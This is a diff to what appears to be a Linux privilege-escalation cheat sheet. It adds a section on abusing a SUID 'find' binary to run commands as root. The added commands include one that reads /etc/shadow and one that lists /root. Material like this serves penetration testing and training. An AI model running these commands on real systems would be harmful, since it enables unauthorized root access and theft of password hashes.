@@ -232,6 +232,16 @@ render_with_liquid: false
 
     If you'll get some SUID files, research the information of them using **[GTFOBins](https://gtfobins.github.io/){:target="_blank"}**.
 
+    - **Find**
+
+        If the "find" command is set as SUID, you can execute some commands as root privileges.
+
+        ```sh
+        find ./ -exec "whoami" \;
+        find /etc/shadow -exec cat {} \;
+        find /root -exec ls -al {} \;
+        ```
+
 7. **Find Writable Directories**
 
     ```sh
